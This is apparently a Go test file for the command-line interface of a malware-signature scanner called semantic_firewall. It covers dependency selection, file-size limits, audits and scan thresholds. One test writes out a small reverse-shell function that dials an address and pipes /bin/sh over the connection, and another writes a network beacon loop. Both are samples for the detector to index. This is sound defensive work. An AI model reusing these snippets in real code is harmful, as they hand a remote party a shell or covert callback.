// -- internal/cli/cli_test.go --
package cli

import (
	"encoding/json"
	"fmt"
	"io/fs"
	"math"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/analysis/topology"
	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/detection"
	"github.com/BlackVectorOps/semantic_firewall/v7/pkg/models"
	"golang.org/x/tools/go/packages"
)

// -- MOCKS --

type MockFileSystem struct {
	Files map[string][]byte
}

func (m *MockFileSystem) Stat(name string) (os.FileInfo, error) {
	if _, ok := m.Files[name]; ok {
		return &mockFileInfo{name: name, size: int64(len(m.Files[name]))}, nil
	}
	return nil, os.ErrNotExist
}
func (m *MockFileSystem) Open(name string) (fs.File, error) { return nil, os.ErrNotExist }
func (m *MockFileSystem) Getwd() (string, error)            { return "/mock/wd", nil }
func (m *MockFileSystem) Abs(path string) (string, error)   { return path, nil }
func (m *MockFileSystem) WalkDir(root string, fn fs.WalkDirFunc) error {
	for name := range m.Files {
		if strings.HasPrefix(name, root) {
			fn(name, &mockDirEntry{name: name}, nil)
		}
	}
	return nil
}
func (m *MockFileSystem) ReadFile(name string) ([]byte, error) {
	if data, ok := m.Files[name]; ok {
		return data, nil
	}
	return nil, os.ErrNotExist
}

type mockFileInfo struct {
	name string
	size int64
}

func (m *mockFileInfo) Name() string       { return m.name }
func (m *mockFileInfo) Size() int64        { return m.size }
func (m *mockFileInfo) Mode() os.FileMode  { return 0644 }
func (m *mockFileInfo) ModTime() time.Time { return time.Now() }
func (m *mockFileInfo) IsDir() bool        { return false }
func (m *mockFileInfo) Sys() any           { return nil }

type mockDirEntry struct{ name string }

func (m *mockDirEntry) Name() string               { return m.name }
func (m *mockDirEntry) IsDir() bool                { return false }
func (m *mockDirEntry) Type() os.FileMode          { return 0644 }
func (m *mockDirEntry) Info() (fs.FileInfo, error) { return &mockFileInfo{name: m.name}, nil }

// -- TESTS --

// TestDependencyFilter verifies that standard library packages are skipped
// while 3rd party packages are retained.
func TestDependencyFilter(t *testing.T) {
	tests := []struct {
		path   string
		expect bool // true = keep (scan), false = skip
	}{
		{"fmt", false},
		{"net/http", false},           // The bug was here (has slash)
		{"github.com/user/lib", true}, // Has dot in first segment
		{"gopkg.in/yaml.v2", true},    // Has dot
		{"myinternal/pkg", false},     // No dot, assumed internal/std
		{"cloud.google.com/go", true}, // Has dot
	}

	for _, tc := range tests {
		pkg := &packages.Package{
			PkgPath: "main",
			Imports: map[string]*packages.Package{
				tc.path: {PkgPath: tc.path},
			},
		}

		kept := false
		for _, d := range selectDependencies([]*packages.Package{pkg}, false) {
			if d.PkgPath == tc.path {
				kept = true
			}
		}
		if kept != tc.expect {
			t.Errorf("Filter logic for %q = %v; want %v", tc.path, kept, tc.expect)
		}
	}
}

func depPaths(pkgs []*packages.Package) []string {
	var out []string
	for _, p := range pkgs {
		out = append(out, p.PkgPath)
	}
	return out
}

// TestSelectDependencies_TraversesOwnModule verifies that third-party imports
// reached through the project's own packages count as dependencies, and that
// only transitive mode follows a dependency's own imports.
func TestSelectDependencies_TraversesOwnModule(t *testing.T) {
	own := &packages.Module{Path: "example.com/app"}
	depMod := &packages.Module{Path: "example.com/lib"}
	nestedMod := &packages.Module{Path: "example.com/nested"}

	nested := &packages.Package{PkgPath: "example.com/nested", Module: nestedMod}
	lib := &packages.Package{PkgPath: "example.com/lib", Module: depMod,
		Imports: map[string]*packages.Package{"example.com/nested": nested}}
	internalPkg := &packages.Package{PkgPath: "example.com/app/internal/store", Module: own,
		Imports: map[string]*packages.Package{"example.com/lib": lib}}
	root := &packages.Package{PkgPath: "example.com/app/cmd/app", Module: own,
		Imports: map[string]*packages.Package{
			"fmt":                            {PkgPath: "fmt"},
			"example.com/app/internal/store": internalPkg,
		}}

	if got := depPaths(selectDependencies([]*packages.Package{root}, false)); !slices.Equal(got, []string{"example.com/lib"}) {
		t.Errorf("direct = %v; want [example.com/lib]", got)
	}
	if got := depPaths(selectDependencies([]*packages.Package{root}, true)); !slices.Equal(got, []string{"example.com/lib", "example.com/nested"}) {
		t.Errorf("transitive = %v; want [example.com/lib example.com/nested]", got)
	}
}

// TestSelectDependencies_ModuleIdentityNotPrefix verifies that a dependency
// whose module path merely shares a prefix with the target's module is still
// treated as a dependency.
func TestSelectDependencies_ModuleIdentityNotPrefix(t *testing.T) {
	dep := &packages.Package{PkgPath: "github.com/foo/barbaz", Module: &packages.Module{Path: "github.com/foo/barbaz"}}
	root := &packages.Package{PkgPath: "github.com/foo/bar", Module: &packages.Module{Path: "github.com/foo/bar"},
		Imports: map[string]*packages.Package{"github.com/foo/barbaz": dep}}

	if got := depPaths(selectDependencies([]*packages.Package{root}, false)); !slices.Equal(got, []string{"github.com/foo/barbaz"}) {
		t.Errorf("deps = %v; want [github.com/foo/barbaz]", got)
	}
}

// countingScanner records how many functions were submitted for scanning.
type countingScanner struct{ scanned int }

func (c *countingScanner) ScanTopology(*topology.FunctionTopology, string) ([]detection.ScanResult, error) {
	c.scanned++
	return nil, nil
}

func (c *countingScanner) ScanTopologyExact(*topology.FunctionTopology, string) (*detection.ScanResult, error) {
	c.scanned++
	return nil, nil
}

func (c *countingScanner) Close() error { return nil }

func (c *countingScanner) SetMatchThreshold(float64) error { return nil }

// TestRunScanDeps_ScansDependencyFunctions loads this repository's pkg/api,
// whose only third-party imports arrive through other packages of this module
// (pkg/diff imports golang.org/x/tools). Direct mode used to load those
// imports as type-less placeholders and scan zero functions in them.
func TestRunScanDeps_ScansDependencyFunctions(t *testing.T) {
	if testing.Short() {
		t.Skip("loads and builds SSA for real dependencies")
	}

	run := func(depth string) ([]string, int, int) {
		scanner := &countingScanner{}
		_, funcs, deps, err := RunScanDeps(RealPackageLoader{}, "../../pkg/api",
			models.ScanOptions{ScanDeps: true, DepsDepth: depth}, scanner)
		if err != nil {
			t.Fatalf("RunScanDeps(%s): %v", depth, err)
		}
		return deps, funcs, scanner.scanned
	}

	directDeps, directFuncs, directScanned := run("direct")
	if !slices.Contains(directDeps, "golang.org/x/tools/go/ssa") {
		t.Errorf("direct deps = %v; want golang.org/x/tools/go/ssa (imported via pkg/diff)", directDeps)
	}
	for _, d := range directDeps {
		if strings.HasPrefix(d, "github.com/BlackVectorOps/semantic_firewall/") {
			t.Errorf("own-module package %s reported as a dependency", d)
		}
	}
	if directFuncs == 0 || directScanned != directFuncs {
		t.Errorf("direct: functions = %d, scanned = %d; want equal and > 0", directFuncs, directScanned)
	}

	transitiveDeps, transitiveFuncs, _ := run("transitive")
	if len(transitiveDeps) <= len(directDeps) || transitiveFuncs <= directFuncs {
		t.Errorf("transitive (%d deps, %d funcs) should exceed direct (%d deps, %d funcs)",
			len(transitiveDeps), transitiveFuncs, len(directDeps), directFuncs)
	}
}

// TestRunCheckLogic_Isolation verifies logic without touching the disk.
func TestRunCheckLogic_Isolation(t *testing.T) {
	mockFS := &MockFileSystem{
		Files: map[string][]byte{
			"/app/main.go": []byte("package main\nfunc main() {}"),
		},
	}

	// Create a dummy file in the list for the logic to find since we mock WalkDir
	// Note: In the real implementation CollectFiles uses WalkDir.
	// Our mock WalkDir iterates the map.

	err := RunCheckLogic(mockFS, "/app/main.go", false, false, "")
	if err != nil {
		t.Fatalf("RunCheckLogic failed with mock FS: %v", err)
	}
}

// panickingFileSystem wraps MockFileSystem but panics on Stat for a specific
// path, as a FileSystem bug would.
type panickingFileSystem struct {
	*MockFileSystem
	panicOn string
}

func (p *panickingFileSystem) Stat(name string) (os.FileInfo, error) {
	if name == p.panicOn {
		panic("synthetic panic for test")
	}
	return p.MockFileSystem.Stat(name)
}

// TestProcessFilesParallel_PanicSurfacedAsError ensures a panic reading a
// file is recorded as an ErrorMessage on the FileOutput and flips the
// hasErrors flag, so --strict fails closed instead of silently passing a
// crashed run.
func TestProcessFilesParallel_PanicSurfacedAsError(t *testing.T) {
	mockFS := &panickingFileSystem{
		MockFileSystem: &MockFileSystem{
			Files: map[string][]byte{
				"/app/boom.go": []byte("package main"),
			},
		},
		panicOn: "/app/boom.go",
	}

	results, hasErrors := ProcessFilesParallel(mockFS, []string{"/app/boom.go"}, true, nil)
	if !hasErrors {
		t.Fatal("expected hasErrors=true after a recovered panic; got false")
	}
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if results[0].ErrorMessage == "" {
		t.Error("expected ErrorMessage to be populated for the panicking file")
	}
	if !strings.Contains(results[0].ErrorMessage, "panic") {
		t.Errorf("ErrorMessage should mention panic, got: %q", results[0].ErrorMessage)
	}
	if results[0].File != "/app/boom.go" {
		t.Errorf("File field lost; got %q", results[0].File)
	}
}

// TestFileSizeGuard verifies strict size limits are enforced.
func TestFileSizeGuard(t *testing.T) {
	mockFS := &MockFileSystem{
		Files: map[string][]byte{
			"/app/huge.go": make([]byte, models.MaxSourceFileSize+100),
		},
	}

	outputs, hasErrors := ProcessFilesParallel(mockFS, []string{"/app/huge.go"}, false, nil)
	expected := fmt.Sprintf("file /app/huge.go exceeds maximum analysis size of %d bytes", models.MaxSourceFileSize)
	if !hasErrors || outputs[0].ErrorMessage != expected {
		t.Errorf("ErrorMessage = %q (hasErrors %v); want %q", outputs[0].ErrorMessage, hasErrors, expected)
	}
}

// TestRunIndex_SkipsImportOnlyInit verifies that a package initializer which
// only runs its imports' initializers is not indexed (its signature would
// match any package with the same imports), while one that does real work is.
func TestRunIndex_SkipsImportOnlyInit(t *testing.T) {
	dir := t.TempDir()
	index := func(src string) []string {
		path := filepath.Join(dir, "sample.go")
		if err := os.WriteFile(path, []byte(src), 0o644); err != nil {
			t.Fatal(err)
		}
		results := fingerprintFiles(RealFileSystem{}, []string{path})
		sigs, _, err := RunIndexJSON(results, "S", "HIGH", "malware", filepath.Join(t.TempDir(), "db.json"))
		if err != nil {
			t.Fatalf("RunIndexJSON: %v", err)
		}
		var names []string
		for _, s := range sigs {
			names = append(names, s.Name)
		}
		return names
	}

	names := index(`package sample

import (
	"net"
	"os/exec"
)

func Payload(addr string) {
	c, _ := net.Dial("tcp", addr)
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = c
	cmd.Run()
}
`)
	if slices.Contains(names, "S_init") {
		t.Errorf("import-only init was indexed: %v", names)
	}
	if !slices.Contains(names, "S_Payload") {
		t.Errorf("payload function not indexed: %v", names)
	}

	names = index(`package sample

import "os"

var home = os.Getenv("HOME")

func Use() string { return home }
`)
	if !slices.Contains(names, "S_init") {
		t.Errorf("init with a package-level initializer was skipped: %v", names)
	}
}

// TestRunAudit_APIKeyOnlyNeededForHighRisk verifies that an audit without an
// API key passes a diff with no escalations, and fails closed on one that has
// them instead of skipping verification.
func TestRunAudit_APIKeyOnlyNeededForHighRisk(t *testing.T) {
	dir := t.TempDir()
	write := func(sub, src string) string {
		p := filepath.Join(dir, sub, "x.go")
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(src), 0o644); err != nil {
			t.Fatal(err)
		}
		return p
	}
	old := write("old", "package x\n\nfunc Handle(s string) int { return len(s) }\n")
	benign := write("benign", "package x\n\nfunc Handle(s string) int { return len(s) + 1 }\n")
	risky := write("risky", "package x\n\nimport \"os/exec\"\n\nfunc Handle(s string) int { exec.Command(s).Run(); return len(s) }\n")

	audit := func(newFile string) (int, models.AuditOutput) {
		var buf strings.Builder
		code, err := RunAudit(&buf, old, newFile, "minor cleanup", "", "gpt-4o", "", true)
		if err != nil {
			t.Fatalf("RunAudit: %v", err)
		}
		var out models.AuditOutput
		if err := json.Unmarshal([]byte(buf.String()), &out); err != nil {
			t.Fatalf("parse audit output: %v\n%s", err, buf.String())
		}
		return code, out
	}

	if code, out := audit(benign); code != 0 || out.Output.Verdict != models.VerdictMatch {
		t.Errorf("benign diff without key: exit %d verdict %s; want 0 MATCH", code, out.Output.Verdict)
	}
	code, out := audit(risky)
	if code == 0 || out.Output.Verdict != models.VerdictError || !strings.Contains(out.Output.Evidence, "no API key") {
		t.Errorf("high-risk diff without key: exit %d verdict %s (%s); want non-zero ERROR naming the missing key",
			code, out.Output.Verdict, out.Output.Evidence)
	}
}

// A scan of a module with a vendor directory loads its dependencies from
// it, as the go command builds it: the vendored module here is in no cache
// and has no go.sum entry.
func TestLoadPackagesWithDeps_VendoredModule(t *testing.T) {
	root := t.TempDir()
	for name, content := range map[string]string{
		"go.mod":                        "module example.com/app\n\ngo 1.22\n\nrequire example.com/dep v1.0.0\n",
		"vendor/modules.txt":            "# example.com/dep v1.0.0\n## explicit; go 1.22\nexample.com/dep\n",
		"vendor/example.com/dep/dep.go": "package dep\n\nimport \"os/exec\"\n\nfunc Run() { exec.Command(\"x\").Run() }\n",
		"main.go":                       "package app\n\nimport \"example.com/dep\"\n\nfunc F() { dep.Run() }\n",
	} {
		p := filepath.Join(root, name)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	pkgs, err := loadPackagesWithDeps(RealPackageLoader{}, root)
	if err != nil {
		t.Fatalf("loadPackagesWithDeps: %v", err)
	}
	var errs []string
	packages.Visit(pkgs, nil, func(p *packages.Package) {
		for _, e := range p.Errors {
			errs = append(errs, e.Error())
		}
	})
	if len(errs) > 0 {
		t.Fatalf("load errors: %v", errs)
	}
	deps := selectDependencies(pkgs, false)
	if len(deps) != 1 || deps[0].PkgPath != "example.com/dep" || deps[0].Types == nil {
		t.Errorf("dependencies %+v; want example.com/dep, typed", deps)
	}
}

// A deps diff has no absent side: an empty directory argument is an error
// before anything is cleaned or loaded (Clean("") is "."), in the CLI entry
// point and in the worker's.
func TestRunDepsDiff_EmptyDirectory(t *testing.T) {
	dir := t.TempDir()
	for _, c := range []struct{ old, new string }{{"", dir}, {dir, ""}, {"", ""}} {
		want := fmt.Sprintf("deps diff needs two module directories; got old %q and new %q", c.old, c.new)
		if err := RunDepsDiff(c.old, c.new, true); err == nil || err.Error() != want {
			t.Errorf("RunDepsDiff(%q, %q) = %v; want %q", c.old, c.new, err, want)
		}
		var out strings.Builder
		if err := RunDepsDiffLogic(&out, c.old, c.new); err == nil || err.Error() != want || out.Len() != 0 {
			t.Errorf("RunDepsDiffLogic(%q, %q) = %v, wrote %q; want %q and no output", c.old, c.new, err, out.String(), want)
		}
	}
}

// A JSON database refuses an invalid threshold, as PebbleDB does, instead
// of scanning at the default.
func TestRunScanLogic_RefusesInvalidThreshold(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "a.go"), []byte("package a\n\nfunc F() {}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	db := filepath.Join(t.TempDir(), "sigs.json")
	if err := os.WriteFile(db, []byte(`{"version":"1.0","signatures":[]}`), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, th := range []float64{math.NaN(), 1.5} {
		opts := models.ScanOptions{DBPath: db, Threshold: th}
		if err := RunScanLogic(RealFileSystem{}, RealPackageLoader{}, dir, opts); err == nil {
			t.Errorf("threshold %v accepted", th)
		}
	}
}

// --threshold 0 reaches a PebbleDB scanner as 0, which its options would
// read as the default: a match at confidence 0 is reported at threshold 0
// and not at the default.
func TestRunScanLogic_PebbleThresholdZero(t *testing.T) {
	write := func(dir, src string) {
		if err := os.WriteFile(filepath.Join(dir, "go.mod"), []byte("module m\n\ngo 1.22\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, "m.go"), []byte(src), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	const body = "\nfunc Beacon(addr string) {\n\tfor {\n\t\tc, err := %s(\"tcp\", addr)\n\t\tif err == nil {\n\t\t\tc.Close()\n\t\t}\n\t\ttime.Sleep(time.Second)\n\t}\n}\n"
	indexed, scanned := t.TempDir(), t.TempDir()
	write(indexed, "package m\n\nimport (\n\t\"net\"\n\t\"time\"\n)\n"+fmt.Sprintf(body, "net.Dial"))
	write(scanned, "package m\n\nimport (\n\t\"net\"\n\t\"time\"\n)\n\nfunc dial(n, a string) (net.Conn, error) { return net.Dial(n, a) }\n"+fmt.Sprintf(body, "dial"))
	db := filepath.Join(t.TempDir(), "sigs.db")
	stdout := os.Stdout
	t.Cleanup(func() { os.Stdout = stdout })
	run := func(f func() error) []byte {
		out, err := os.CreateTemp(t.TempDir(), "out")
		if err != nil {
			t.Fatal(err)
		}
		os.Stdout = out
		err = f()
		os.Stdout = stdout
		if err != nil {
			t.Fatal(err)
		}
		data, _ := os.ReadFile(out.Name())
		return data
	}
	run(func() error { return RunIndex(indexed, "beacon", "HIGH", "malware", db) })
	alerts := func(threshold float64) int {
		var res struct{ Alerts []detection.ScanResult }
		data := run(func() error {
			return RunScanLogic(RealFileSystem{}, RealPackageLoader{}, scanned, models.ScanOptions{DBPath: db, Threshold: threshold})
		})
		if err := json.Unmarshal(data, &res); err != nil {
			t.Fatalf("scan output: %v: %s", err, data)
		}
		return len(res.Alerts)
	}
	if n := alerts(models.DefaultScanThreshold); n != 0 {
		t.Errorf("%d alerts at the default threshold; want 0", n)
	}
	if n := alerts(0); n == 0 {
		t.Error("no alert at threshold 0")
	}
}
